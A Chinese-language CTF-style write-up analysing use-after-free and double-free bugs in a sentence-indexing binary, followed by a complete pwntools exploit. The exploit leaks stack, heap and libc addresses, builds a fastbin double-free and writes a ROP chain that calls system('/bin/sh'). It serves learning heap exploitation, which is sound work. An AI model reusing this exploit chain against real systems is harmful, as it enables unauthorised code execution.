## 漏洞成因

### 关键结构体分析
程序使用链表管理句子索引，节点结构如下（基于反编译代码推断）：
```c
struct node {
    char *word_ptr;        // +0x00: 指向单词的指针
    int word_length;       // +0x08: 单词长度
    char *sentence_ptr;    // +0x10: 指向句子的指针
    int sentence_size;     // +0x18: 句子大小
    struct node *next;     // +0x20: 指向下一个节点的指针
};
```
全局链表头：`qword_6020B8`

### 漏洞分析
**主要漏洞：Use-After-Free (UAF) 和 Double-Free**

1. **UAF漏洞**：
   - 在`sub_400AD0()`（搜索删除功能）中，当用户选择删除句子时：
     ```c
     if (v3[0] == 121) { // 'y'
         memset(*(void **)(i + 16), 0, *(int *)(i + 24)); // 清空句子内容
         free(*(void **)(i + 16)); // 释放句子缓冲区
         puts("Deleted!");
     }
     ```
   - **问题**：只释放了句子缓冲区（`*(void **)(i + 16)`），但链表节点本身未被释放，导致节点指针仍然有效但指向已释放内存。

2. **Double-Free漏洞**：
   - 结合UAF，通过特定操作序列可以对同一内存块多次释放。
   - 在`sub_400C00()`中，复杂的句子解析逻辑可能在某些条件下导致内存管理错误。

3. **堆溢出潜在风险**：
   - `sub_4009B0()`函数有严格的长度检查，但第一个堆chunk的元数据被破坏表明可能存在堆布局问题。

**漏洞触发路径**：
1. 索引多个包含相同关键词的句子
2. 搜索并删除这些句子
3. 利用UAF访问已释放的节点
4. 通过精心设计的操作序列触发double-free

## 漏洞利用过程

### 利用步骤概览
| 步骤 | 操作 | 内存关键变化 | 目的 |
|------|------|--------------|------|
| 1 | `leak_stack_ptr()` | 栈地址泄漏到堆缓冲区 | 获取栈基址，为ROP链做准备 |
| 2 | `leak_heap_ptr()` | Fastbins形成，堆地址泄漏 | 获取堆布局信息 |
| 3 | `leak_libc_ptr()` | Unsortedbin包含libc指针 | 泄漏libc基址，计算system地址 |
| 4 | `perform_double_free()` | Fastbins形成循环链 | 创建double-free条件 |
| 5 | `write_to_stack_and_get_shell()` | 栈地址写入堆，ROP链部署 | 实现任意代码执行 |
| 6 | `quit_app()` | 程序退出触发ROP链 | 执行system("/bin/sh") |
| 7 | `p.interactive()` | 进程替换为/bin/dash | 获取shell控制权 |

### 详细内存变化分析

#### 堆内存演变
```
初始状态: 干净堆布局
↓ Step 1-2
堆chunk元数据被破坏，fastbins开始形成
↓ Step 3  
unsortedbin出现libc指针，fastbins包含正常链
↓ Step 4
fastbins形成double-free循环链: A→B→A
↓ Step 5
栈地址写入堆，fastbins指向栈空间
↓ Step 6-7
所有bins清空，堆整理完成，进程替换为shell
```

#### 关键地址泄漏过程
- **栈泄漏**：通过输入超长非数字字符串触发错误处理，从栈帧中泄漏返回地址
- **堆泄漏**：利用UAF读取已释放但未清零的堆指针
- **libc泄漏**：通过操作unsortedbin chunk获取main_arena地址

#### 安全机制绕过
- **Stack Canary**：始终完好，exp通过ROP链而非栈溢出来绕过
- **NX**：通过ROP链执行代码
- **ASLR**：通过信息泄漏获取实际地址

## Exploit

```python
from pwn import *
import re

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./data/sample4')
elf = ELF('./data/sample4')
libc = elf.libc

def menu():
    p.recvuntil(b'3: Quit')

def index_sentence(content):
    p.sendline(b'2')
    p.sendline(str(len(content)).encode())
    p.send(content)

def search_word(word):
    p.sendline(b'1')
    p.sendline(str(len(word)).encode())
    p.send(word)

def reply_yes():
    p.sendline(b'y')

def reply_no():
    p.sendline(b'n')

def quit_app():
    menu()
    p.sendline(b'3')

def leak_stack_ptr():
    """步骤1: 泄漏栈指针
    通过发送超长非数字字符串触发错误处理，从栈帧中泄漏地址"""
    menu()
    p.send(b'a'*96)  # 填充缓冲区，触发栈地址泄漏
    p.recvuntil(b'is not a valid number')
    stackptr_match = re.findall(b'a{48}(......) is not', p.recvuntil(b'is not a valid number\n'))
    stackptr = u64(stackptr_match[0] + b'\0\0')  # 解析栈地址
    return stackptr

def leak_heap_ptr():
    """步骤2: 泄漏堆基地址
    通过UAF漏洞读取已释放但仍在链表中的堆指针"""
    index_sentence(b'a'*50 + b' DREAM')  # 创建第一个句子节点
    menu()
    index_sentence(b'b'*50 + b' DREAM')  # 创建第二个句子节点
    menu()
    search_word('DREAM')  # 搜索触发UAF
    reply_yes()  # 删除第一个句子
    reply_yes()  # 删除第二个句子
    menu()
    search_word(b'\0' * 5)  # 搜索空单词触发UAF读取
    p.recvuntil(b'Found 56: ')
    heapptr = u64(p.recvuntil(b'Delete')[:8])  # 解析堆地址
    reply_no()
    return heapptr - 0x10b0  # 计算堆基地址

def leak_libc_ptr():
    """步骤3: 泄漏libc基地址
    通过操作unsortedbin chunk获取main_arena地址"""
    menu()
    index_sentence(('b'*256 + ' FLOWER ').ljust(512, 'c'))  # 创建大chunk进入unsortedbin
    menu()
    search_word('FLOWER')
    reply_yes()  # 释放chunk到unsortedbin
    menu()
    search_word(b'\0'*6)  # UAF读取unsortedbin中的libc指针
    p.recvuntil(b'Found 512: ')
    mainarena88 = u64(p.recvuntil(b'Delete')[:8])  # 解析main_arena+88地址
    libcbase = mainarena88 - 0x3c4b78  # 计算libc基地址
    reply_no()
    return libcbase

def perform_double_free():
    """步骤4: 执行double-free攻击
    创建fastbin循环链用于任意地址分配"""
    menu()
    index_sentence(b'a'*51 + b' ROCK')  # 创建三个相同关键词的句子
    menu()
    index_sentence(b'b'*51 + b' ROCK')
    menu()
    index_sentence(b'c'*51 + b' ROCK')
    menu()
    search_word('ROCK')  # 搜索并连续删除，触发double-free
    reply_yes()
    reply_yes()
    reply_yes()
    menu()
    search_word(b'\0' * 4)  # 触发UAF，巩固double-free状态
    reply_yes()
    reply_no()

def write_to_stack_and_get_shell(stackptr, libcbase):
    """步骤5: 部署ROP链获取shell
    利用double-free链将栈地址写入堆，然后部署ROP链"""
    menu()
    # 利用double-free分配指向栈的chunk
    index_sentence(p64(stackptr + 0x52).ljust(48, b'\0') + b' MIRACLE')
    menu()
    index_sentence(b'd'*48 + b' MIRACLE')  # 填充fastbin链
    menu()
    index_sentence(b'e'*48 + b' MIRACLE')
    menu()
    
    # 构建ROP链
    rop = ROP(libc)
    pop_rdi = libcbase + rop.find_gadget(['pop rdi', 'ret']).address
    bin_sh = libcbase + next(libc.search(b'/bin/sh'))
    system_addr = libcbase + libc.sym['system']
    exit_addr = libcbase + libc.sym['exit']
    
    # 部署ROP payload
    payload = (b'A'*6 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(exit_addr)).ljust(56, b'U')
    index_sentence(payload)

# 主利用流程
stack_ptr = leak_stack_ptr()  # 步骤1: 泄漏栈指针
heap_base = leak_heap_ptr()   # 步骤2: 泄漏堆基地址
libc_base = leak_libc_ptr()   # 步骤3: 泄漏libc基地址
perform_double_free()         # 步骤4: 执行double-free攻击
write_to_stack_and_get_shell(stack_ptr, libc_base)  # 步骤5: 部署ROP链
quit_app()                    # 步骤6: 触发ROP链执行
p.interactive()               # 步骤7: 进入交互式shell
```

### 关键注释说明
1. **信息泄漏**：通过程序错误处理和UAF漏洞泄漏关键地址，绕过ASLR
2. **Double-Free利用**：创建fastbin循环链实现任意地址分配
3. **ROP链构建**：利用泄漏的libc地址计算gadget和函数地址
4. **进程控制**：通过精心设计的堆操作实现代码执行，最终获取shell

该漏洞利用成功演示了如何通过UAF和double-free漏洞组合实现从信息泄漏到代码执行的完整攻击链。
